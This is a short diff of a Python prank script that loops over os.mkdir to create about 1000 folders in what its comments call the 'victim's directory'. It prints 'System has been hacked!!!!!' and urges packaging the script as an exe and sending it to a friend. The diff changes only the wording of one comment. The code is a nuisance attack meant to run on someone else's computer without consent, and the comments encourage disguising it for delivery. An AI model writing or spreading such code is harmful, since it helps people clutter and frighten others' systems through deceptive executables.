@@ -13,7 +13,7 @@ for i in range(1, a1+1):                                                        
     os.mkdir(a)
 print("System has been hacked!!!!! Check your current directory")
 
-#This code can make 1000 new folders in the victim's directory .
+#This code in below can make 1000 new folders in the victim's directory.
 #N:B - YOU MUST HAVE TO CAREFUL TO RUN THIS CODE IN YOUR COMPUTER!!!
     #JUST MAKE AN exe FILE AND SEND  IT TO YOUR FRIEND AND ENJOY!
 import os
